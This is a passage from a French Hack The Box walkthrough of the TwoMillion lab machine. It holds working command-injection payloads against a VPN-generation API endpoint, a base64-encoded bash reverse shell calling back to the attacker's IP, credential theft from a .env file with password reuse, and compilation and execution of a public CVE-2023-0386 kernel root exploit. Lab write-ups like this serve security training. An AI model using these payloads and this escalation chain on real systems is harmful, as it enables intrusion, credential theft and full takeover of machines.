curl -v -X POST -d '{"username": "0xMR007"}' -H "Content-Type: application/json" http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=6rpp80g8sueusjtr6fgeqd5314" -o vpn.ovpn
Note: Unnecessary use of -X or --request, POST is already inferred.
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.159.192
*   Trying 10.129.159.192:80...
* Connected to 2million.htb (10.129.159.192) port 80
* using HTTP/1.x
> POST /api/v1/admin/vpn/generate HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.14.1
> Accept: */*
> Cookie: PHPSESSID=6rpp80g8sueusjtr6fgeqd5314
> Content-Type: application/json
> Content-Length: 23
> 
} [23 bytes data]
* upload completely sent off: 23 bytes
< HTTP/1.1 200 OK
< Server: nginx
< Date: Sun, 10 Aug 2025 16:24:17 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
{ [9374 bytes data]
100 10855    0 10832  100    23  23400     49 --:--:-- --:--:-- --:--:-- 23495
* Connection #0 to host 2million.htb left intact

ll
total 32K
-rw-rw-r-- 1 mr007 mr007 1,1K  9 août  11:25 scan.txt
-rw-rw-r-- 1 mr007 mr007  12K  9 août  11:25 scan.xml
-rw-rw-r-- 1 mr007 mr007  470  9 août  11:17 table.md
	-rw-rw-r-- 1 mr007 mr007  11K  9 août  18:21 vpn.ovpn
```

Parfait ! Nous avons réussi à générer un fichier VPN.

C’est une très bonne nouvelle ce fichier semble être généré en fonction de notre entrée utilisateur (**input**). De plus, si ce fichier est généré à l’aide d’une fonction système comme `exec` ou `system` en PHP et que les entrées ne sont pas correctement vérifiées (aucune **sanitization**) une injection de commandes pourrait être possible.

### Exemples de codes PHP vulnérables à l’injection de commande

```php
system("genvpn --user={$username}");
```

```php
exec("bash gen_config.sh {$username}");
```

Dans tous 2 cas, si nous arrivons a injecté une commande système en entrée via la variable `$username`, la machine cible exécutera :

```bash
# Si la variable $username contient la chaine "test;id;" :
genvpn --user=test;id; # En Bash, le ; permet d'exécuter une deuxième commande sur une ligne
```

Essayons de reproduire cela dans notre cas.

```bash
curl -X POST -d '{"username": "0xMR007;id;"}' -H "Content-Type: application/json" http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=6rpp80g8sueusjtr6fgeqd5314" 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Parfait ! L’endpoint `/api/v1/admin/vpn/generate` est bien vulnérable à l’injection de commande.

**Réponse :** `/api/v1/admin/vpn/generate`

## Exploitation

Maintenant que nous arrivons à exécuter des commandes simples via l’endpoint, on peut essayer de mettre en place un reverse shell ce qui nous permettra d’intéragir proprement avec la machine cible.

Mise en place du listener ***pwncat*** (pwncat nous permet d’obtenir un reverse shell bien plus fonctionnel que netcat)

```bash
pwncat -lp 4444 
[18:28:29] Welcome to pwncat 🐈!                                                                        __main__.py:164
bound to 0.0.0.0:4444 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

Ou avec **netcat**

```bash
nc -lnvp
```

Pour maximiser nos chances d’exécution de notre reverse shell par la machine cible, nous pouvons encoder notre payload (partie exécutante de l’attaque) pour plusieurs raisons : contournement des filtres/WAF, éviter la corruption de celui-ci (caractères spéciaux), cacher le payload (dans un sens) et utiliser un format valide.

Un encodage souvent utilisé en web que nous avons précédemment vu est l’encodage en **base64.**

Pour ce faire, nous pouvons utiliser la commande suivante :

```bash
echo 'bash -i >& /dev/tcp/<IP_HTB>/4444 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xOC80NDQ0IDA+JjEK
```

Bien, maintenant envoyons notre requête.

```bash
curl -X POST -d '{"username": "0xMR007;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xOC80NDQ0IDA+JjEK | base64 -d | bash;"}' -H "Content-Type: application/json" http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=6rpp80g8sueusjtr6fgeqd5314"
```

Du côté du listener nous avons bien reçue une connexion en reverse shell !

```bash
pwncat -lp 4444
[18:37:52] Welcome to pwncat 🐈!                                                                        __main__.py:164
[18:37:59] received connection from 10.129.159.192:42702                                                     bind.py:84
[18:38:00] 10.129.159.192:42702: registered new host w/ db                                               manager.py:957
(local) pwncat$ # CTRL + D pour intéragir avec la machine cible
(remote) www-data@2million:/var/www/html$
```

## Post-exploitation

Nous avons maintenant accès à la machine cible par reverse shell. Parfait.

## Q9 - Fichier .env

**Rappel :** *Quel fichier est couramment utilisé dans les applications PHP pour stocker les valeurs des variables d’environnement ?*

Regardons ce qui se trouve dans le répertoire courant :

```bash
(remote) www-data@2million:/var/www/html$ ls -la
total 56
drwxr-xr-x 10 root root 4096 Aug 11 09:30 .
drwxr-xr-x  3 root root 4096 Aug 11 06:41 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4096 Aug 11 09:30 VPN
drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x  5 root root 4096 Jun  6  2023 css
drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x  2 root root 4096 Jun  6  2023 images
-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
drwxr-xr-x  3 root root 4096 Jun  6  2023 js
drwxr-xr-x  2 root root 4096 Jun  6  2023 views
```

Un fichier `.env` semble être disponible, ce type de fichier est très sensible étant donné qu’il peut contenir les informations de connexions à une API, des identifiants, etc…

**Réponse : `.env`**

## Q10 - Flag utilisateur

**Rappel :** *Soumettez le flag situé dans le répertoire personnel de l'utilisateur admin.*

Mais c’est parfait pour nous ! jetons-y un oeil

```bash
(remote) www-data@2million:/var/www/html$ cat .env 
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Très intéressant ! des informations de connexion à une base de données y sont stockées.

Vérifions si l’utilisateur `admin` est disponible sur le système

```bash
(remote) www-data@2million:/var/www/html$ ls -la /home/
total 12
drwxr-xr-x  3 root  root  4096 Jun  6  2023 .
drwxr-xr-x 19 root  root  4096 Jun  6  2023 ..
drwxr-xr-x  4 admin admin 4096 Jun  6  2023 admin
```

Parfait apparemment l’utilisateur `admin` est bien disponible. S’il utilise le même mot de passe que celui de la base de donnée nous pourrons nous connecté en tant que cet utilisateur !

Étant donné son nom, il se pourrait qu’il ai des privilèges administrateur.

### Mouvement latéral

```bash
(remote) www-data@2million:/var/www/html$ su admin
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:/var/www/html$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin)

admin@2million:/var/www/html$ cd
admin@2million:~$ ls -la
total 32
drwxr-xr-x 4 admin admin 4096 Jun  6  2023 .
drwxr-xr-x 3 root  root  4096 Jun  6  2023 ..
lrwxrwxrwx 1 root  root     9 May 26  2023 .bash_history -> /dev/null
-rw-r--r-- 1 admin admin  220 May 26  2023 .bash_logout
-rw-r--r-- 1 admin admin 3771 May 26  2023 .bashrc
drwx------ 2 admin admin 4096 Jun  6  2023 .cache
-rw-r--r-- 1 admin admin  807 May 26  2023 .profile
drwx------ 2 admin admin 4096 Jun  6  2023 .ssh
-rw-r----- 1 root  admin   33 Aug 10 13:30 user.txt
admin@2million:~$ cat user.txt 
5afc549d5971e9599c2e1c5f9189ede3
```

Parfait, nous avons pu nous connecter en tant qu’`admin` et récupérer le flag `user.txt` 

**Réponse :** 5afc549d5971e9599c2e1c5f9189ede3

## Q11 - Email source

**Rappel :** *Quelle est l'adresse e-mail de l'expéditeur de l'e-mail envoyé à admin ?*

J’ai essayé de vérifier si l’utilisateur `admin` avait des privilèges **sudo** avec la commande : 

`sudo -l` mais malheureusement il n’en a pas.

Bien essayons de regarder les fichiers qui appartiennent à l’utilisateur `admin`.

```bash
(remote) www-data@2million:/etc$ find / -type f -readable -user admin 2>/dev/null 
/home/admin/.profile
/home/admin/.bash_logout
/home/admin/.bashrc
/var/mail/admin
```

Le fichier `/var/mail/admin` semble être intéressant, voyons ce qu’il contient

```bash
(remote) www-data@2million:/etc$ cat /var/mail/admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

Bien, d’après ce mail il s’agit d’une demande de mise à jour d’OS sur le serveur web. L’expéditeur semble inquiet car plusieurs vulnérabilités (CVEs) au niveau du kernel Linux ont été publiées. Il à l’air particulièrement préoccupé par l’une d’entre elles (celle concernant OverlayFS / Fuse).

Nous avons aussi obtenu la réponse à la question :

**Réponse :** `ch4p@2million.htb`

## Q12 - ID CVE

**Rappel :** *Quel est l'ID CVE 2023 d'une vulnérabilité qui permet à un attaquant de déplacer des fichiers dans le système de fichiers Overlay tout en conservant des métadonnées telles que les bits propriétaire et SetUID ?*

### Escalade de privilèges

D’après le mail précédent, le système serait vulnérable à une exploitation kernel.

Vérifions la version du kernel Linux

```bash
(remote) www-data@2million:/etc$ uname -r 
5.15.70-051570-generic
```

À retenir : Version du kernel Linux → `5.15.70`

En cherchant un peu sur Internet, on tombe rapidement sur la `CVE-2023-0386` une vulnérabilité kernel permettant de devenir root (élévation de privilèges).

1er lien trouvé : https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/

J’ai aussi trouvé un exploit GitHub qui semble sûr (403 étoiles) :

https://github.com/xkaneiki/CVE-2023-0386

**Réponse :** `CVE-2023-0386`

## Q13 - Flag root

**Rappel :** *Soumettez le flag situé dans le répertoire personnel de root.*

Commençons par cloner le repo GitHub afin de récupérer les fichiers nécessaires à l’exploitation de la `CVE-2023-0386`

```bash
git clone https://github.com/xkaneiki/CVE-2023-0386.git                                               
Clonage dans 'CVE-2023-0386-main'...
remote: Enumerating objects: 24, done.
remote: Counting objects: 100% (24/24), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 24 (delta 7), reused 21 (delta 5), pack-reused 0 (from 0)
Réception d'objets: 100% (24/24), 426.11 Kio | 3.44 Mio/s, fait.
Résolution des deltas: 100% (7/7), fait.
```

Bien maintenant que nous avons le nécessaire, essayons de compiler l’exploit à l’aide de la commande `make`

```bash
# Problème :
make all                                                                                   
gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
fuse.c:3:10: fatal error: fuse.h: Aucun fichier ou dossier de ce nom
    3 | #include <fuse.h>
      |          ^~~~~~~~
compilation terminated.
make: *** [Makefile:2: all] Error 1

# Solution :
sudo apt install libfuse-dev
```

Une erreur de compilation c’est produite sur ma machine, pour résoudre ce problème il suffit simplement d’installer la bibliothèque libfuse comme indiqué ci-dessus. Essayons à nouveau.

```bash
# Problème :
make all                    
gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
fuse.c: In function ‘main’:
fuse.c:214:12: error: implicit declaration of function ‘read’; did you mean ‘fread’? [-Wimplicit-function-declaration]
  214 |     while (read(fd, content + clen, 1) > 0)
      |            ^~~~
      |            fread
fuse.c:216:5: error: implicit declaration of function ‘close’; did you mean ‘pclose’? [-Wimplicit-function-declaration]
  216 |     close(fd);
      |     ^~~~~
      |     pclose
fuse.c:221:5: error: implicit declaration of function ‘rmdir’ [-Wimplicit-function-declaration]
  221 |     rmdir(mount_path);
      |     ^~~~~
make: *** [Makefile:2: all] Error 1

# Solution :
Ajouter les deux include suivants dans le fichier fuse.c
#include <unistd.h>
#include <sys/stat.h>
```

Deuxième problème : des fonctions systèmes utilisées dans l’exploit ne sont pas reconnus, sûrement à cause d’un oubli d’inclusion des bibliothèques système. Comme indiqué ci-dessus il suffit d’ajouter les **include** nécessaires. Essayons à nouveau (plus d’erreurs promis)

```bash
make all  
gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/14/../../../x86_64-linux-gnu/libfuse.a(fuse.o) : dans la fonction « fuse_new_common » :
(.text+0xb1af): avertissement : Using 'dlopen' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
gcc -o exp exp.c -lcap
gcc -o gc getshell.c
```

Parfait ! Notre exploit a bien été compilé. Mettons tout cela dans un fichier zip afin de l’envoyer sur la machine cible.

```bash
zip -r exploit.zip CVE-2023-0386-main 
  adding: CVE-2023-0386-main/ (stored 0%)
  adding: CVE-2023-0386-main/exp (deflated 77%)
  adding: CVE-2023-0386-main/gc (deflated 86%)
  adding: CVE-2023-0386-main/getshell.c (deflated 58%)
  adding: CVE-2023-0386-main/fuse.c (deflated 68%)
  adding: CVE-2023-0386-main/test/ (stored 0%)
  adding: CVE-2023-0386-main/test/mnt (deflated 82%)
  adding: CVE-2023-0386-main/test/mnt.c (deflated 62%)
  adding: CVE-2023-0386-main/test/fuse_test.c (deflated 74%)
  adding: CVE-2023-0386-main/Makefile (deflated 20%)
  adding: CVE-2023-0386-main/exp.c (deflated 64%)
  adding: CVE-2023-0386-main/fuse (deflated 59%)
  adding: CVE-2023-0386-main/README.md (deflated 39%)
  adding: CVE-2023-0386-main/ovlcap/ (stored 0%)
  adding: CVE-2023-0386-main/ovlcap/.gitkeep (stored 0%)
  
# Assurez-vous d'être dans le répertoire contenant les fichiers nécessaires à l'exploit
serve # alias perso utiliser plutôt la commande : python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Bien, maintenant que nous avons zipper nos fichiers et mis en place notre serveur HTTP transférons notre fichier zip vers la machine cible à l’aide de la commande `wget`

```bash
(remote) www-data@2million:/tmp$ wget http://<HTB_IP>/exploit.zip
--2025-08-10 21:49:20--  http://<HTB_IP>/exploit.zip
Connecting to <HTB_IP>:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 532520 (520K) [application/zip]
Saving to: 'exploit.zip'

exploit.zip                   100%[================================================>] 520.04K  2.46MB/s    in 0.2s    

2025-08-10 21:49:20 (2.46 MB/s) - 'exploit.zip' saved [532520/532520]

```

Sur la machine cible on peut alors décompresser notre fichier zip

```bash
(remote) www-data@2million:/tmp$ unzip exploit.zip 
Archive:  exploit.zip
   creating: CVE-2023-0386-main/
  inflating: CVE-2023-0386-main/exp  
  inflating: CVE-2023-0386-main/gc   
  inflating: CVE-2023-0386-main/getshell.c  
  inflating: CVE-2023-0386-main/fuse.c  
   creating: CVE-2023-0386-main/test/
  inflating: CVE-2023-0386-main/test/mnt  
  inflating: CVE-2023-0386-main/test/mnt.c  
  inflating: CVE-2023-0386-main/test/fuse_test.c  
  inflating: CVE-2023-0386-main/Makefile  
  inflating: CVE-2023-0386-main/exp.c  
  inflating: CVE-2023-0386-main/fuse  
  inflating: CVE-2023-0386-main/README.md  
   creating: CVE-2023-0386-main/ovlcap/
 extracting: CVE-2023-0386-main/ovlcap/.gitkeep
```

Puis se rendre dans le répertoire contenant l’exploit.

Dans un premier temps on peut exécuter la première partie de l’exploit en arrière plan à l’aide du  `&` soit `./fuse ./ovlcap/lower ./gc &`. Puis, dans un second temps, exécuter la deuxième partie `./exp`

```bash
(remote) www-data@2million:/tmp$ cd CVE-2023-0386-main/
(remote) www-data@2million:/tmp/CVE-2023-0386-main$ ls
Makefile  README.md  exp  exp.c  fuse  fuse.c  gc  getshell.c  ovlcap  test
(remote) www-data@2million:/tmp/CVE-2023-0386-main$ ./fuse ./ovlcap/lower ./gc &
[1] 4941
(remote) www-data@2million:/tmp/CVE-2023-0386-main$ [+] len of gc: 0x3ef0
./exp 
uid:33 gid:33
[+] mount success
[+] readdir
[+] getattr_callback
/file
total 8
drwxr-xr-x 1 root   root     4096 Aug 10 21:51 .
drwxrwxr-x 6 root   root     4096 Aug 10 21:51 ..
-rwsrwxrwx 1 nobody nogroup 16112 Jan  1  1970 file
[+] open_callback
/file
[+] read buf callback
offset 0
size 16384
path /file
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601
[+] exploit success!
root@2million:/tmp/CVE-2023-0386-main# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

Parfait l’exploit a fonctionné nous avons obtenu un shell sous `root` ! Nous avons bien réussi à exploiter la `CVE-2023-0386` 

Récupérons le flag root pour enfin terminer la box TwoMillion !

```bash
root@2million:~# cd /root
root@2million:/root# ls -la
total 48
drwx------  8 root root 4096 Aug 10 13:30 .
drwxr-xr-x 19 root root 4096 Jun  6  2023 ..
lrwxrwxrwx  1 root root    9 Apr 27  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Jun  6  2023 .cache
drwxr-xr-x  3 root root 4096 Jun  6  2023 .cleanup
drwx------  4 root root 4096 Jun  6  2023 .gnupg
drwxr-xr-x  3 root root 4096 Jun  6  2023 .local
lrwxrwxrwx  1 root root    9 May 26  2023 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
drwx------  2 root root 4096 Jun  6  2023 .ssh
-rw-r-----  1 root root   33 Aug 10 13:30 root.txt
drwx------  3 root root 4096 Jun  6  2023 snap
-rw-r--r--  1 root root 3767 Jun  6  2023 thank_you.json
root@2million:/root# cat root.txt 
bcb5e9d8cfa44d82195a61bd1feda45d
```

**Réponse :** `bcb5e9d8cfa44d82195a61bd1feda45d`

Parfait ! Nous avons réussi à pwn la box TwoMillion, félicitations 🥳 !

![image.png](attachment:13bcf6b1-dad8-42d6-8d2c-15662f1108ef:8fe3934c-0935-4824-8b3f-655cb7fec1d8.png)

## Message de HTB

Si vous êtes curieux vous avez sûrement remarqué la présence d’un fichier JSON `thank_you.json` dans le répertoire de `root`. Cette section s’intéresse à son décodage.

### Étape 1 : Encodage URL

Première étape nous devons décoder les données encodées en URL

```bash
root@2million:/root# cat thank_you.json 
{"encoding": "url", "data": "%7B%22encoding%22:%20%22hex%22,%20%22data%22:%20%227b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d%22%7D"}
```

Avec Cyberchef on obtient le résultat ci-dessous

### Étape 2 : Encodage hexa

De même pour l’encodage en hexa

```bash
{"encoding": "hex", "data": "7b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d"}
```

On obtient alors un encodage combiné `base64` + XOR comme durant la box

### Étape 3 : Encodage base64 + XOR

```bash
{"encryption": "xor", "encrpytion_key": "HackTheBox", "encoding": "base64", "data": "DAQCGXQgBCEELCAEIQQsSCYtAhU9DwofLURvSDgdaAARDnQcDTAGFCQEB0sgB0UjARYnFA0IMUgEYgIXJQQNHzsdFmICESQEEB87BgBiBhZoDhYZdAIKNx0WLRhDHzsPADYHHTpPQzw9HA1iBhUlBA0YMUgPLRZYKQ8HSzMaBDYGDD0FBkd0HwBiDB0kBAEZNRwAYhsQLUECCDwBADQKFS0PF0s7DkUwChkrCQoFM0hXYgIRJA0KBDpIFycCGToKAgk4DUU3HB06EkJLAAAMMU8RJgIRDjABBy4KWC4EAh90Hwo3AxxoDwwfdAAENApYKgQGBXQYCjEcESoNBksjAREqAA08QQYKNwBFIwEcaAQVDiYRRS0BHWgOBUstBxBsZXIOEwwGdBwNJ08OLRMaSzYNAisBFiEPBEd0IAQhBCwgBCEELEgNIxxYKgQGBXQKECsDDGgUEwQ6SBEqClgqBA8CMQ5FNgcZPEEIBTsfCScLHy1BEAM1GgwsCFRoAgwHOAkHLR0ZPAgMBXhIBCwLWCAADQ8nRQosTx0wEQYZPQ0LIQpYKRMGSzIdCyYOFS0PFwo4SBEtTwgtExAEOgkJYg4WLEETGTsOADEcEScPAgd0DxctGAwgT0M/Ow8ANgcdOk1DHDFIDSMZHWgHDBggDRcnC1gpD0MOOh4MMAAWJQQNH3QfDScdHWgIDQU7HgQ2BhcmQRcDJgETJxxYKQ8HSycDDC4DC2gAEQ50AAosChxmQSYKNwBFIQcZJA0GBTMNRSEAFTgNBh8xDEliChkrCUMGNQsNKwEdaAIMBSUdADAKHGRBAgUwSAA0CgoxQRAAPQQJYgMdKRMNDjBIDSMcWCsODR8mAQc3Gx0sQRcEdBwNJ08bJw0PDjccDDQKWCEPFw44BAwlChYrBEMfPAkRYgkNLQ0QSyAADDFPDiEDEQo6HEUhABUlFA0CIBFLSGUsJ0EGCjcARSMBHGgEFQ4mEUUvChUqBBFLOw5FNgcdaCkCCD88DSctFzBBAAQ5BRAsBgwxTUMfPAkLKU8BJxRDDTsaRSAKESYGQwp0GAQwG1gnB0MfPAEWYgYWKxMGDz0KCSdPEicUEQUxEUtiNhc9E0MIOwYRMAYaPRUKBDobRSoODi1BEAM1GAAmTwwgBEMdMRocYgkZKhMKCHQHA2IADTpBEwc1HAMtHRVoAA0PdAELMR8ROgQHSyEbRTYAWCsODR89BhAjAxQxQQoFOgcTIxsdaAAND3QNEy0DDi1PQzwxSAQwClghDA4OOhsALhZYOBMMHjBICiRPDyAAF0sjDUUqDg4tQQIINwcIMgMROwkGD3QcCiUKDCAEEUd0CQsmTw8tQQYKMw0XLhZYKQ8XAjcBFSMbHWgVCw50Cwo3AQwkBBAYdAUMLgoLPA4NDidIHCcbWDwOQwg7BQBsZXIABBEOcxtFNgBYPAkGSzoNHTZPGyAAEx8xGkliGBAtEwZLIw1FNQYUJEEABDocDCwaHWgVDEskHRYqTwwgBEMJOx0LJg4KIQQQSzsORSEWGi0TEA43HRcrGwFkQQoFJxgMMApYPAkGSzoNHTZPHy0PBhk1HAwtAVgnB0MOIAAMIQ4UaAkCCD8NFzFDWCkPB0s3GgAjGx1oAEMcOxoJJk8PIAQRDnQDCy0YFC0FBA50ARZiDhsrBBAYPQoJJ08MJ0ECBzhGb0g4ETwJQw8xDRUnHAxoBhEKIAERNwsdZGtpPzwNRQoOGyM1Cw4WBx1iOx0pDA=="}
```

Finalement nous obtenons le message suivant de la part de HackTheBox

### Résultat original

```
Dear HackTheBox Community,

We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.

From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.

To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.

Here's to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.

With deepest gratitude,

The HackTheBox Team
```

### Traduction 🇫🇷

```
